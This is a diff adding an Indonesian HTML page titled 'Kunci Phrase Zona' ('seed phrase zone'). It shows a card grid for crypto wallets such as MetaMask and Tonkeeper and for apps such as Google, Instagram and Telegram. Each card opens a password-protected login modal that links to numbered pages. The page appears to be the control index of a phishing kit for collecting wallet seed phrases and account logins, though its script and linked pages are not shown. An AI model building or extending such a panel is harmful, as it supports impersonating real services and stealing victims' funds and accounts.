@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kunci Phrase Zona</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="header">
+        <div class="logo">Kunci Phrase Zona</div>
+        <div class="search-bar">
+            <input type="text" placeholder="Cari vault saya">
+        </div>
+    </div>
+    <div id="tips-container" class="tips-container"></div>
+    <div class="container">
+        <!-- Bagian Wallet -->
+        <div class="section-title">Wallet</div>
+        <div class="site-grid">
+            <!-- MetaMask -->
+            <div class="site-card" onclick="openLoginModal('lzonsb/2739.html')">
+                <img src="logo/metamask.png" alt="MetaMask logo">
+                <div class="site-name">MetaMask</div>
+            </div>
+            <!-- Tonkeeper -->
+            <div class="site-card" onclick="openLoginModal('lzonsb/1028.html')">
+                <img src="logo/tonkeeper.png" alt="Tonkeeper logo">
+                <div class="site-name">Tonkeeper</div>
+            </div>
+            <!-- Tonhub -->
+            <div class="site-card" onclick="openLoginModal('lzonsb/9273.html')">
+                <img src="logo/tonhub.png" alt="Tonhub logo">
+                <div class="site-name">Tonhub</div>
+            </div>
+            <!-- Bitget Wallet -->
+            <div class="site-card" onclick="openLoginModal('lzonsb/10202.html')">
+                <img src="logo/bitget.png" alt="Bitget Wallet logo">
+                <div class="site-name">Bitget Wallet</div>
+            </div>
+        </div>
+        <!-- Daftar Aplikasi -->
+        <div class="section-title">Daftar Aplikasi</div>
+        <div class="site-grid">
+            <!-- Apple -->
+            <div class="site-card" onclick="openLoginModal('koler/193738.html')">
+                <img src="logos/a.png" alt="Apple logo">
+                <div class="site-name">Apple</div>
+            </div>
+            <!-- Instagram -->
+            <div class="site-card" onclick="openLoginModal('koler/10102983.html')">
+                <img src="logos/instagram.png" alt="Instagram logo">
+                <div class="site-name">Instagram</div>
+            </div>
+            <!-- Google -->
+            <div class="site-card" onclick="openLoginModal('koler/023838.html')">
+                <img src="logos/google.png" alt="Google logo">
+                <div class="site-name">Google</div>
+            </div>
+            <!-- Discord -->
+            <div class="site-card" onclick="openLoginModal('koler/028388.html')">
+                <img src="logos/d.png" alt="Discord logo">
+                <div class="site-name">Discord</div>
+            </div>
+            <!-- Telegram -->
+            <div class="site-card" onclick="openLoginModal('koler/293939866788.html')">
+                <img src="logos/t.png" alt="Telegram logo">
+                <div class="site-name">Telegram</div>
+            </div>
+        </div>
+    </div>
+    <!-- Modal Login -->
+    <div id="login-modal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">&times;</span>
+            <h2>Login</h2>
+            <input type="password" id="password" placeholder="Masukkan Password">
+            <button onclick="login()">Login</button>
+            <div id="error" class="error"></div>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
